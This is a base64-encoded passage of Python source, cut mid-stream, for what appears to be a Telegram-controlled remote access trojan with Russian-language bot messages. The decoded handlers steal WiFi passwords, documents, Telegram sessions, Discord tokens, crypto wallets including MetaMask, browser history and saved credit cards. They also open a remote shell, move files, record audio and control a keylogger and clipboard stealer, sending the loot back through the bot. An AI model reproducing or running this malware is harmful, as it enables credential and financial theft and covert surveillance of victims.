Cx0LrQsCDQvtGC0L/RgNCw0LLQutC4OiB7c3RyKGUpfSIpCgogICAgZGVmIGxvY2tfc2NyZWVuX2NvbW1hbmQoc2VsZik6CiAgICAgICAgaWYgc2VsZi5zY3JlZW5fbG9ja2VyLmxvY2tfc2NyZWVuKCk6CiAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5SSINCt0LrRgNCw0L0g0LfQsNCx0LvQvtC60LjRgNC+0LLQsNC9ISIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQntGI0LjQsdC60LAg0LHQu9C+0LrQuNGA0L7QstC60Lgg0Y3QutGA0LDQvdCwIikKCiAgICBkZWYga2lsbF9wcm9jZXNzX2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5raWxsX21vZGUgPSBUcnVlCiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCfkoAgKtCg0JXQltCY0Jwg0JfQkNCS0JXQoNCo0JXQndCY0K8g0J/QoNCe0KbQldCh0KHQntCSKlxcXFxuXFxcXG7QntGC0L/RgNCw0LLRjNGC0LUg0LjQvNGPINC/0YDQvtGG0LXRgdGB0LAg0LjQu9C4IFBJRCDQtNC70Y8g0LfQsNCy0LXRgNGI0LXQvdC40Y8uXFxcXG7QndCw0L/RgNC40LzQtdGAOiBgZGlzY29yZC5leGVgINC40LvQuCBgMTIzNGBcXFxcblxcXFxu0JTQu9GPINCy0YvRhdC+0LTQsCDQvtGC0L/RgNCw0LLRjNGC0LUgL2V4aXQiKQoKICAgIGRlZiBraWxsX2FjdGl2ZV9wcm9jZXNzX2NvbW1hbmQoc2VsZik6CiAgICAgICAgIiIi0JfQsNC60YDRi9Cy0LDQtdGCINC/0YDQvtGG0LXRgdGBINCw0LrRgtC40LLQvdC+0LPQviDQvtC60L3QsCIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgcHJvY2Vzc19uYW1lLCBwaWQgPSBzZWxmLnByb2Nlc3NfbWFuYWdlci5nZXRfYWN0aXZlX3dpbmRvd19wcm9jZXNzKCkKICAgICAgICAgICAgaWYgcHJvY2Vzc19uYW1lIGFuZCBwaWQ6CiAgICAgICAgICAgICAgICBpZiBzZWxmLnByb2Nlc3NfbWFuYWdlci5raWxsX3Byb2Nlc3NfYnlfcGlkKHBpZCk6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiLinIUg0JDQutGC0LjQstC90YvQuSDQv9GA0L7RhtC10YHRgSBge3Byb2Nlc3NfbmFtZX1gIChQSUQ6IHtwaWR9KSDQt9Cw0LLQtdGA0YjQtdC9ISIpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKGYi4p2MINCd0LUg0YPQtNCw0LvQvtGB0Ywg0LfQsNCy0LXRgNGI0LjRgtGMINCw0LrRgtC40LLQvdGL0Lkg0L/RgNC+0YbQtdGB0YEgYHtwcm9jZXNzX25hbWV9YCIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7Qv9GA0LXQtNC10LvQuNGC0Ywg0LDQutGC0LjQstC90YvQuSDQv9GA0L7RhtC10YHRgSIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShmIuKdjCDQntGI0LjQsdC60LAg0LfQsNCy0LXRgNGI0LXQvdC40Y8g0LDQutGC0LjQstC90L7Qs9C+INC/0YDQvtGG0LXRgdGB0LA6IHtzdHIoZSl9IikKCiAgICBkZWYgcHJvY2Vzc19saXN0X2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKaoSDQn9C+0LvRg9GH0LDRjiDQuNC90YTQvtGA0LzQsNGG0LjRjiDQviDQv9GA0L7RhtC10YHRgdCw0YUuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgcHJvY2Vzc2VzID0gc2VsZi5wcm9jZXNzX21hbmFnZXIuZ2V0X3J1bm5pbmdfcHJvY2Vzc2VzKCkKICAgICAgICAgICAgcHJvY2Vzc2VzLnNvcnQoa2V5PWxhbWJkYSB4OiB4WydtZW1vcnlfcGVyY2VudCddIGlmIHhbJ21lbW9yeV9wZXJjZW50J10gZWxzZSAwLCByZXZlcnNlPVRydWUpCiAgICAgICAgICAgIAogICAgICAgICAgICBwcm9jZXNzX3RleHQgPSAi4pqhICrQotCe0J8g0J/QoNCe0KbQldCh0KHQntCSINCf0J4g0J/QkNCc0K/QotCYOipcXFxcblxcXFxuIgogICAgICAgICAgICBmb3IgcHJvYyBpbiBwcm9jZXNzZXNbOjE1XToKICAgICAgICAgICAgICAgIG1lbW9yeV9tYiA9IHByb2NbJ21lbW9yeV9pbmZvJ10ucnNzIC8vIDEwMjQgLy8gMTAyNCBpZiBwcm9jLmdldCgnbWVtb3J5X2luZm8nKSBlbHNlIDAKICAgICAgICAgICAgICAgIHByb2Nlc3NfdGV4dCArPSBmIip7cHJvY1snbmFtZSddfSogKFBJRDoge3Byb2NbJ3BpZCddfSlcXFxcbvCfkr4g0J/QsNC80Y/RgtGMOiB7bWVtb3J5X21ifSBNQlxcXFxuXFxcXG4iCiAgICAgICAgICAgIAogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShwcm9jZXNzX3RleHQpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDQv9C+0LvRg9GH0LXQvdC40Y8g0L/RgNC+0YbQtdGB0YHQvtCyIikKCiAgICBkZWYgc3lzdGVtX2luZm9fY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi8J+SuyDQodC+0LHQuNGA0LDRjiDRgdC40YHRgtC10LzQvdGD0Y4g0LjQvdGE0L7RgNC80LDRhtC40Y4uLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgc3RlYWxlciA9IEFkdmFuY2VkU3RlYWxlcigpCiAgICAgICAgICAgIHN0ZWFsZXIuc3RlYWxfc3lzdGVtX2luZm8oKQogICAgICAgICAgICBzeXNfaW5mbyA9IHN0ZWFsZXIuZGF0YVsic3lzdGVtX2luZm8iXQogICAgICAgICAgICBpbmZvX3RleHQgPSBmIirwn5K7INCh0JjQodCi0JXQnNCd0JDQryDQmNCd0KTQntCg0JzQkNCm0JjQrypcXFxcblxcXFxuKvCfkaQg0J/QvtC70YzQt9C+0LLQsNGC0LXQu9GMOioge3N5c19pbmZvLmdldCgndXNlcm5hbWUnKX1cXFxcbirwn5al77iPINCa0L7QvNC/0YzRjtGC0LXRgDoqIHtzeXNfaW5mby5nZXQoJ2NvbXB1dGVyX25hbWUnKX1cXFxcbirimpnvuI8g0J7QoToqIHtzeXNfaW5mby5nZXQoJ29zJyl9XFxcXG4q8J+UpyDQkNGA0YXQuNGC0LXQutGC0YPRgNCwOioge3N5c19pbmZvLmdldCgnYXJjaGl0ZWN0dXJlJyl9XFxcXG4q8J+SviDQn9GA0L7RhtC10YHRgdC+0YA6KiB7c3lzX2luZm8uZ2V0KCdwcm9jZXNzb3InKVs6MTAwXX0uLi5cXFxcbirwn46uINCS0LjQtNC10L7QutCw0YDRgtCwOiogeycsICcuam9pbihzeXNfaW5mby5nZXQoJ2dwdScsIFtdKSl9XFxcXG4q8J+noCDQntC/0LXRgNCw0YLQuNCy0L3QsNGPINC/0LDQvNGP0YLRjDoqIHtzeXNfaW5mby5nZXQoJ3JhbScpfVxcXFxuKvCfjJAg0JvQvtC60LDQu9GM0L3Ri9C5IElQOioge3N5c19pbmZvLmdldCgnaXBfbG9jYWwnKX1cXFxcbirwn4yQINCS0L3QtdGI0L3QuNC5IElQOioge3N5c19pbmZvLmdldCgnaXBfZXh0ZXJuYWwnKX0iCiAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKGluZm9fdGV4dCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0J7RiNC40LHQutCwIikKCiAgICBkZWYgc3lzdGVtX3JlcG9ydF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5OKINCh0L7Qt9C00LDRjiDQv9C+0LvQvdGL0Lkg0YHQuNGB0YLQtdC80L3Ri9C5INC+0YLRh9C10YIuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgc3RlYWxlciA9IEFkdmFuY2VkU3RlYWxlcigpCiAgICAgICAgICAgIHN0ZWFsZXIuc3RlYWxfc3lzdGVtX2luZm8oKQogICAgICAgICAgICByZXBvcnQgPSBzdGVhbGVyLmNyZWF0ZV9zeXN0ZW1fcmVwb3J0KCkKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiJgYGB7cmVwb3J0fWBgYCIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDRgdC+0LfQtNCw0L3QuNGPINC+0YLRh9C10YLQsCIpCgogICAgZGVmIHdpZmlfcGFzc3dvcmRzX2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCfk7Yg0JjRidGDIFdpRmkg0L/QsNGA0L7Qu9C4Li4uIikKICAgICAgICBzdGVhbGVyID0gQWR2YW5jZWRTdGVhbGVyKCkKICAgICAgICBzdGVhbGVyLmdldF93aWZpX3Bhc3N3b3JkcygpCiAgICAgICAgaWYgc3RlYWxlci5kYXRhWyJ3aWZpX3Bhc3N3b3JkcyJdOgogICAgICAgICAgICB3aWZpX3RleHQgPSAi8J+TtiAq0J3QkNCZ0JTQldCd0J3Qq9CVIFdpRmkg0KHQldCi0Jg6KlxcXFxuXFxcXG4iCiAgICAgICAgICAgIGZvciB3aWZpIGluIHN0ZWFsZXIuZGF0YVsid2lmaV9wYXNzd29yZHMiXToKICAgICAgICAgICAgICAgIHdpZmlfdGV4dCArPSBmIip7d2lmaVsnc3NpZCddfSogLSBge3dpZmlbJ3Bhc3N3b3JkJ119YFxcXFxuIgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSh3aWZpX3RleHQpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCBXaUZpINC/0LDRgNC+0LvQuCDQvdC1INC90LDQudC00LXQvdGLIikKCiAgICBkZWYgc3RlYWxfZG9jdW1lbnRzX2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCfk4Qg0JrRgNCw0LTRgyDQtNC+0LrRg9C80LXQvdGC0YsuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgc3RlYWxlciA9IEFkdmFuY2VkU3RlYWxlcigpCiAgICAgICAgICAgIGRvY3VtZW50cyA9IHN0ZWFsZXIuc3RlYWxfZG9jdW1lbnRzKCkKICAgICAgICAgICAgaWYgZG9jdW1lbnRzOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiLwn5OEINCd0LDQudC00LXQvdC+INC00L7QutGD0LzQtdC90YLQvtCyOiB7bGVuKGRvY3VtZW50cyl9IikKICAgICAgICAgICAgICAgICMg0J7RgtC/0YDQsNCy0LvRj9C10Lwg0L/QtdGA0LLRi9C5INC00L7QutGD0LzQtdC90YIg0LrQsNC6INC/0YDQuNC80LXRgAogICAgICAgICAgICAgICAgaWYgZG9jdW1lbnRzOgogICAgICAgICAgICAgICAgICAgIGRvYyA9IGRvY3VtZW50c1swXQogICAgICAgICAgICAgICAgICAgIGRvY190ZXh0ID0gZiIq0J/QoNCY0JzQldCgINCU0J7QmtCj0JzQldCd0KLQkDoqXFxcXG7wn5OdINCY0LzRjzoge2RvY1snbmFtZSddfVxcXFxu8J+TgSDQn9GD0YLRjDoge2RvY1sncGF0aCddfVxcXFxu8J+TiiDQoNCw0LfQvNC10YA6IHtkb2NbJ3NpemUnXX0g0LHQsNC50YIiCiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZG9jX3RleHQpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCU0L7QutGD0LzQtdC90YLRiyDQvdC1INC90LDQudC00LXQvdGLIikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0J7RiNC40LHQutCwINC60YDQsNC20Lgg0LTQvtC60YPQvNC10L3RgtC+0LIiKQoKICAgIGRlZiBzdGVhbF90ZWxlZ3JhbV9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5OxINCY0YnRgyBUZWxlZ3JhbSDRgdC10YHRgdC40LguLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgc3RlYWxlciA9IEFkdmFuY2VkU3RlYWxlcigpCiAgICAgICAgICAgIHN0ZWFsZXIuc3RlYWxfdGVsZWdyYW1fc2Vzc2lvbnMoKQogICAgICAgICAgICBpZiBzdGVhbGVyLmRhdGFbInRlbGVncmFtX3Nlc3Npb25zIl06CiAgICAgICAgICAgICAgICBzZXNzaW9uX3RleHQgPSAi8J+TsSAq0J3QkNCZ0JTQldCd0J3Qq9CVIFRFTEVHUkFNINCh0JXQodCh0JjQmDoqXFxcXG5cXFxcbiIKICAgICAgICAgICAgICAgIGZvciBzZXNzaW9uIGluIHN0ZWFsZXIuZGF0YVsidGVsZWdyYW1fc2Vzc2lvbnMiXToKICAgICAgICAgICAgICAgICAgICBzZXNzaW9uX3RleHQgKz0gZiIq0J/Rg9GC0Yw6KiB7c2Vzc2lvblsncGF0aCddfVxcXFxuKtCk0LDQudC70L7QsjoqIHtsZW4oc2Vzc2lvblsnZmlsZXMnXSl9XFxcXG5cXFxcbiIKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKHNlc3Npb25fdGV4dCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwgVGVsZWdyYW0g0YHQtdGB0YHQuNC4INC90LUg0L3QsNC50LTQtdC90YsiKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQntGI0LjQsdC60LAg0L/QvtC40YHQutCwIFRlbGVncmFtIikKCiAgICBkZWYgc3RlYWxfZGlzY29yZF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn46uINCY0YnRgyBEaXNjb3JkINGC0L7QutC10L3Riy4uLiIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBzdGVhbGVyID0gQWR2YW5jZWRTdGVhbGVyKCkKICAgICAgICAgICAgc3RlYWxlci5zdGVhbF9kaXNjb3JkX3Rva2VucygpCiAgICAgICAgICAgIGlmIHN0ZWFsZXIuZGF0YVsiZGlzY29yZF90b2tlbnMiXToKICAgICAgICAgICAgICAgIGRpc2NvcmRfdGV4dCA9ICLwn46uICrQndCQ0JnQlNCV0J3QndCr0JUgRElTQ09SRCDQlNCQ0J3QndCr0JU6KlxcXFxuXFxcXG4iCiAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gc3RlYWxlci5kYXRhWyJkaXNjb3JkX3Rva2VucyJdOgogICAgICAgICAgICAgICAgICAgIGRpc2NvcmRfdGV4dCArPSBmIirQpNCw0LnQuzoqIHt0b2tlblsncGF0aCddfVxcXFxuKtCh0L7QtNC10YDQttC40LzQvtC1Oioge3Rva2VuWydjb250ZW50J11bOjEwMF19Li4uXFxcXG5cXFxcbiIKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKGRpc2NvcmRfdGV4dCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwgRGlzY29yZCDRgtC+0LrQtdC90Ysg0L3QtSDQvdCw0LnQtNC10L3RiyIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDQv9C+0LjRgdC60LAgRGlzY29yZCIpCgogICAgZGVmIHN0ZWFsX2NyeXB0b19jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5KwINCY0YnRgyDQutGA0LjQv9GC0L4t0LrQvtGI0LXQu9GM0LrQuC4uLiIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBzdGVhbGVyID0gQWR2YW5jZWRTdGVhbGVyKCkKICAgICAgICAgICAgc3RlYWxlci5zdGVhbF9jcnlwdG9fd2FsbGV0cygpCiAgICAgICAgICAgIGNyeXB0b190ZXh0ID0gIvCfkrAgKtCd0JDQmdCU0JXQndCd0KvQlSDQmtCg0JjQn9Ci0J4t0JrQntCo0JXQm9Cs0JrQmDoqXFxcXG5cXFxcbiIKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHN0ZWFsZXIuZGF0YVsibWV0YW1hc2tfZGF0YSJdOgogICAgICAgICAgICAgICAgY3J5cHRvX3RleHQgKz0gIipNZXRhTWFzazoqXFxcXG4iCiAgICAgICAgICAgICAgICBmb3Igd2FsbGV0IGluIHN0ZWFsZXIuZGF0YVsibWV0YW1hc2tfZGF0YSJdOgogICAgICAgICAgICAgICAgICAgIGNyeXB0b190ZXh0ICs9IGYi0J/Rg9GC0Yw6IHt3YWxsZXRbJ3BhdGgnXX1cXFxcbiIKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHN0ZWFsZXIuZGF0YVsiY3J5cHRvX3dhbGxldHMiXToKICAgICAgICAgICAgICAgIGNyeXB0b190ZXh0ICs9ICJcXFxcbirQlNGA0YPQs9C40LUg0LrQvtGI0LXQu9GM0LrQuDoqXFxcXG4iCiAgICAgICAgICAgICAgICBmb3Igd2FsbGV0IGluIHN0ZWFsZXIuZGF0YVsiY3J5cHRvX3dhbGxldHMiXToKICAgICAgICAgICAgICAgICAgICBjcnlwdG9fdGV4dCArPSBmInt3YWxsZXRbJ3dhbGxldCddfToge3dhbGxldFsncGF0aCddfVxcXFxuIgogICAgICAgICAgICAKICAgICAgICAgICAgaWYgY3J5cHRvX3RleHQgIT0gIvCfkrAgKtCd0JDQmdCU0JXQndCd0KvQlSDQmtCg0JjQn9Ci0J4t0JrQntCo0JXQm9Cs0JrQmDoqXFxcXG5cXFxcbiI6CiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShjcnlwdG9fdGV4dCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0JrRgNC40L/RgtC+LdC60L7RiNC10LvRjNC60Lgg0L3QtSDQvdCw0LnQtNC10L3RiyIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDQv9C+0LjRgdC60LAg0LrQvtGI0LXQu9GM0LrQvtCyIikKCiAgICBkZWYgYnJvd3Nlcl9oaXN0b3J5X2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCfjJAg0JjRidGDINC40YHRgtC+0YDQuNGOINCx0YDQsNGD0LfQtdGA0LAuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgc3RlYWxlciA9IEFkdmFuY2VkU3RlYWxlcigpCiAgICAgICAgICAgIHN0ZWFsZXIuc3RlYWxfYWxsX2Jyb3dzZXJzKCkKICAgICAgICAgICAgaWYgc3RlYWxlci5kYXRhWyJicm93c2VyX2hpc3RvcnkiXToKICAgICAgICAgICAgICAgIGhpc3RvcnlfdGV4dCA9ICLwn4yQICrQmNCh0KLQntCg0JjQryDQkdCg0JDQo9CX0JXQoNCQICjQotC+0L8tMTApOipcXFxcblxcXFxuIgogICAgICAgICAgICAgICAgZm9yIGhpc3RvcnkgaW4gc3RlYWxlci5kYXRhWyJicm93c2VyX2hpc3RvcnkiXVs6MTBdOgogICAgICAgICAgICAgICAgICAgIGhpc3RvcnlfdGV4dCArPSBmIip7aGlzdG9yeVsnYnJvd3NlciddfToqIHtoaXN0b3J5Wyd0aXRsZSddfVxcXFxue2hpc3RvcnlbJ3VybCddfVxcXFxuXFxcXG4iCiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShoaXN0b3J5X3RleHRbOjQwMDBdKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQmNGB0YLQvtGA0LjRjyDQsdGA0LDRg9C30LXRgNCwINC90LUg0L3QsNC50LTQtdC90LAiKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQntGI0LjQsdC60LAg0L/QvtC40YHQutCwINC40YHRgtC+0YDQuNC4IikKCiAgICBkZWYgY3JlZGl0X2NhcmRzX2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCfkrMg0JjRidGDINGB0L7RhdGA0LDQvdC10L3QvdGL0LUg0LrQsNGA0YLRiy4uLiIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBzdGVhbGVyID0gQWR2YW5jZWRTdGVhbGVyKCkKICAgICAgICAgICAgc3RlYWxlci5zdGVhbF9hbGxfYnJvd3NlcnMoKQogICAgICAgICAgICBpZiBzdGVhbGVyLmRhdGFbInNhdmVkX2NyZWRpdF9jYXJkcyJdOgogICAgICAgICAgICAgICAgY2FyZHNfdGV4dCA9ICLwn5KzICrQodCe0KXQoNCQ0J3QldCd0J3Qq9CVINCa0JDQoNCi0Ks6KlxcXFxuXFxcXG4iCiAgICAgICAgICAgICAgICBmb3IgY2FyZCBpbiBzdGVhbGVyLmRhdGFbInNhdmVkX2NyZWRpdF9jYXJkcyJdOgogICAgICAgICAgICAgICAgICAgIGNhcmRzX3RleHQgKz0gZiIqe2NhcmRbJ2Jyb3dzZXInXX06KlxcXFxu0JLQu9Cw0LTQtdC70LXRhjoge2NhcmRbJ25hbWUnXX1cXFxcbtCh0YDQvtC6OiB7Y2FyZFsnZXhwaXJlcyddfVxcXFxu0J3QvtC80LXRgDoge2NhcmRbJ251bWJlciddfVxcXFxuXFxcXG4iCiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShjYXJkc190ZXh0KQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQodC+0YXRgNCw0L3QtdC90L3Ri9C1INC60LDRgNGC0Ysg0L3QtSDQvdCw0LnQtNC10L3RiyIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDQv9C+0LjRgdC60LAg0LrQsNGA0YIiKQoKICAgIGRlZiBzaGVsbF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2hlbGxfbW9kZSA9IFRydWUKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4pqhICrQoNCV0JbQmNCcINCa0J7QnNCQ0J3QlNCd0J7QmSDQodCi0KDQntCa0JgqXFxcXG5cXFxcbtCe0YLQv9GA0LDQstC70Y/QudGC0LUg0LrQvtC80LDQvdC00Ysg0LTQu9GPINCy0YvQv9C+0LvQvdC10L3QuNGPLlxcXFxu0JTQu9GPINCy0YvRhdC+0LTQsCDQvtGC0L/RgNCw0LLRjNGC0LUgL2V4aXQiKQoKICAgIGRlZiBkb3dubG9hZF9maWxlX2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5kb3dubG9hZF9tb2RlID0gVHJ1ZQogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5OlICrQoNCV0JbQmNCcINCh0JrQkNCn0JjQktCQ0J3QmNCvKlxcXFxuXFxcXG7QntGC0L/RgNCw0LLRjNGC0LUg0L/QvtC70L3Ri9C5INC/0YPRgtGMINC6INGE0LDQudC70YMg0LTQu9GPINGB0LrQsNGH0LjQstCw0L3QuNGPLlxcXFxu0J3QsNC/0YDQuNC80LXRgDogYEM6XFxcXFxcXFxVc2Vyc1xcXFxcXFxcVXNlclxcXFxcXFxcRGVza3RvcFxcXFxcXFxcZmlsZS50eHRgXFxcXG5cXFxcbtCU0LvRjyDQstGL0YXQvtC00LAg0L7RgtC/0YDQsNCy0YzRgtC1IC9leGl0IikKCiAgICBkZWYgdXBsb2FkX2ZpbGVfY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnVwbG9hZF9tb2RlID0gVHJ1ZQogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5OkICrQoNCV0JbQmNCcINCX0JDQk9Cg0KPQl9Ca0JgqXFxcXG5cXFxcbtCe0YLQv9GA0LDQstGM0YLQtSDRhNCw0LnQuyDQsiBUZWxlZ3JhbSAtINC+0L0g0LHRg9C00LXRgiDRgdC+0YXRgNCw0L3QtdC9INC90LAg0YDQsNCx0L7Rh9C40Lkg0YHRgtC+0LsuXFxcXG5cXFxcbtCU0LvRjyDQstGL0YXQvtC00LAg0L7RgtC/0YDQsNCy0YzRgtC1IC9leGl0IikKCiAgICBkZWYgYXVkaW9fc3RhcnRfY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi8J+Ome+4jyDQl9Cw0L/QuNGB0Ywg0LfQstGD0LrQsCDQkNCa0KLQmNCS0JjQoNCe0JLQkNCd0JAgKDYwINGB0LXQutGD0L3QtCkiKQogICAgICAgIHNlbGYuYXVkaW9fcmVjb3JkZXIuc3RhcnQoKQogICAgICAgIGRlZiBhdXRvX3N0b3AoKToKICAgICAgICAgICAgdGltZS5zbGVlcCg2MCkKICAgICAgICAgICAgc2VsZi5hdWRpb19zdG9wX2NvbW1hbmQoKQogICAgICAgIFRocmVhZCh0YXJnZXQ9YXV0b19zdG9wKS5zdGFydCgpCgogICAgZGVmIGF1ZGlvX3N0b3BfY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4o+577iPINCX0LDQv9C40YHRjCDQt9Cy0YPQutCwINCe0KHQotCQ0J3QntCS0JvQldCd0JAiKQogICAgICAgIHNlbGYuYXVkaW9fcmVjb3JkZXIuc3RvcCgpCgogICAgZGVmIGF1ZGlvX2dldF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5OBINCe0YLQv9GA0LDQstC70Y/RjiDQt9Cw0L/QuNGB0YwuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgYXVkaW9fcGF0aCA9IG9zLnBhdGguam9pbih0ZW1wZmlsZS5nZXR0ZW1wZGlyKCksICJhdWRpb19yZWNvcmQud2F2IikKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoYXVkaW9fcGF0aCk6CiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oYXVkaW9fcGF0aCwgInJiIikgYXMgZjoKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5zZW5kX2RvY3VtZW50KGYucmVhZCgpLCAiYXVkaW9fcmVjb3JkLndhdiIsICLwn46Z77iPINCX0LDQv9C40YHRjCDQt9Cy0YPQutCwIik6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0J7RiNC40LHQutCwINC+0YLQv9GA0LDQstC60Lgg0YTQsNC50LvQsCIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCk0LDQudC7INC30LDQv9C40YHQuCDQvdC1INC90LDQudC00LXQvSIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShmIuKdjCDQntGI0LjQsdC60LAg0L7RgtC/0YDQsNCy0LrQuDoge3N0cihlKX0iKQoKICAgIGRlZiBmdWxsX3NjYW5fY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi8J+agCDQl9CQ0J/Qo9Ch0Jog0J/QntCb0J3QntCT0J4g0KHQmtCQ0J3QkCDQodCY0KHQotCV0JzQqy4uLiIpCiAgICAgICAgc3RlYWxlciA9IEFkdmFuY2VkU3RlYWxlcigpCiAgICAgICAgc3RlYWxlci5ydW4oKQogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinIUg0J/QvtC70L3QvtC1INGB0LrQsNC90LjRgNC+0LLQsNC90LjQtSDQt9Cw0LLQtdGA0YjQtdC90L4hIikKCiAgICBkZWYgc3RvcF9hbGxfY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLmtleWxvZ2dlci5zdG9wKCkKICAgICAgICBzZWxmLm1vdXNlX2xvZ2dlci5zdG9wKCkKICAgICAgICBzZWxmLmNsaXBib2FyZF9zdGVhbGVyLnN0b3AoKQogICAgICAgIHNlbGYuZmlsZV9tb25pdG9yLnN0b3AoKQogICAgICAgIHNlbGYuYXVkaW9fcmVjb3JkZXIuc3Rv